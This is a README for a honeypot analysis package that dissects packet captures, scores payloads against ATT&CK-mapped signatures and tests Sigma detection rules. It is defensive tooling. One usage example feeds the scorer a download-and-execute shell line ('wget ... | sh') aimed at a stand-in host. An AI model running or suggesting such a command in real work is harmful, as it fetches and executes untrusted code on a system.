# deception-shield

Packet capture dissection and attack pattern analysis for the Deception Shield
honeypot sensor network.

The package does four things:

- **Dissects captures** by driving tshark, so payloads arrive reassembled and
  protocols are identified by dissection rather than by port number.
- **Scores payloads** against a weighted signature set mapped to MITRE ATT&CK
  techniques, folding the result into triage bands.
- **Derives patterns** from the resulting records: recurring behaviours,
  correlated campaigns, and sources sweeping ports rather than pursuing targets.
- **Runs detection as code**: assembles Cowrie command sessions, evaluates the
  Sigma rules in `../detections/sigma` with an engine that matches the way
  Elasticsearch does, gates them in CI against labelled fixtures, and measures
  them on a held-out week against a benign baseline.

```bash
pip install -e ".[dev]"

deception-shield replay capture.pcap.gz
deception-shield analyse --since 24h
deception-shield score --text 'wget http://x/m.sh | sh'
```

```bash
deception-shield rules check
deception-shield rules test
deception-shield evaluate sessions.jsonl benign.jsonl --labels labels.csv --holdout 2026-W40
```

`tshark` must be on PATH for capture dissection. Scoring and pattern analysis
have no external requirements; the Sigma engine needs PyYAML, which installs
with the package.

Full documentation is in the repository's `docs/` directory.
